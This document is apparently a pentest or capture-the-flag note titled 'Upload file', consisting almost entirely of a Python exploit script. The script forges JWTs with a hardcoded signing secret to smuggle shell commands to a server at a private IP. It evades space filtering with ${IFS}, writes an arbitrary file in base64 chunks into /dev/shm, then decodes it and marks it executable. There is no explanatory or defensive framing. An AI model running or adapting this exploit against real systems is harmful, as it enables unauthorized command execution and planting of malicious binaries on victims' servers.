# Upload file

```python
import base64
import sys
import jwt
import requests
import os
import time
from itertools import islice

# Configuration
URL = 'http://172.16.1.22:3000'
BASE_DIR = '/dev/shm/'
SECRET_KEY = 'PSmu3dR2wMZQvNge'
MAX_CHUNKS = 20

def sendFile(data, filename, chunk_num):
    """Send file chunk to server with enhanced error tracking."""
    # Escape special characters to prevent shell injection
    escaped_data = data.replace("'", "'\\''")
    cmd = f"echo '{escaped_data}'|tee -a {BASE_DIR}temp_{filename}"
    cmd = cmd.replace(' ', '${IFS}')
    
    try:
        # Encode JWT token
        token = jwt.encode({'cmd': cmd}, SECRET_KEY, algorithm='HS256')
        headers = {
            'Authorization': f'Bearer {token}'
        }
        
        # Send request
        start_time = time.time()
        response = requests.get(URL, headers=headers, timeout=10)
        
        # Detailed response logging
        print(f"\nChunk {chunk_num} Details:")
        print(f"Response Status: {response.status_code}")
        print(f"Response Length: {len(response.content)} bytes")
        print(f"Time Taken: {time.time() - start_time:.2f} seconds")
        
        if response.status_code != 200:
            print(f"Error: Non-200 status code received: {response.status_code}")
            print(f"Response Content: {response.content}")
            return False
        
        results = response.content.strip().decode()
        return True
    
    except requests.exceptions.RequestException as e:
        print(f"\nNetwork Error on chunk {chunk_num}: {e}")
        return False
    except Exception as e:
        print(f"\nUnexpected Error on chunk {chunk_num}: {e}")
        return False

def convertFile(file):
    """Upload file in chunks, enhanced tracking."""
    lines = open(file, "rb").readlines()
    filename = os.path.basename(file)
    totallines = len(lines)
    
    print(f"Total lines in file: {totallines}")
    print(f"Will attempt to upload up to {MAX_CHUNKS} chunks")
    
    successful_chunks = 0
    failed_chunks = 0
    
    for i, line in enumerate(lines[:MAX_CHUNKS], 1):
        print(f"Uploading chunk {i}/{min(MAX_CHUNKS, totallines)}", end="\r", flush=True)
        
        encoded = base64.b64encode(line).decode()
        success = sendFile(encoded, filename, i)
        
        if success:
            successful_chunks += 1
        else:
            failed_chunks += 1
            print(f"\nFailed to upload chunk {i}")
            
            # Optional: break on first failure
            # break
    
    print(f"\nUpload Summary:")
    print(f"Successful Chunks: {successful_chunks}")
    print(f"Failed Chunks: {failed_chunks}")
    
    return filename

def base2Binary(filename):
    """Convert base64 chunks back to original file."""
    cmd = f"cat {BASE_DIR}temp_{filename}|base64 -d|tee {BASE_DIR}{filename};chmod +x {BASE_DIR}{filename}"
    cmd = cmd.replace(' ', '${IFS}')
    
    try:
        token = jwt.encode({'cmd': cmd}, SECRET_KEY, algorithm='HS256')
        headers = {
            'Authorization': f'Bearer {token}'
        }
        
        response = requests.get(URL, headers=headers)
        results = response.content.strip()
        return results
    except Exception as e:
        print(f"Error converting file: {e}")
        return None

def main():
    """Main execution function."""
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <file_to_upload>")
        sys.exit(1)
    
    file = sys.argv[1]
    
    if not os.path.exists(file):
        print(f"Error: File {file} does not exist.")
        sys.exit(1)
    
    print("Transferring...")
    filename = convertFile(file)
    
    print("\nConverting to original state")
    base2Binary(filename)
    
    print(f"The file is now ready at {BASE_DIR}{filename}")

if __name__ == "__main__":
    main()
```

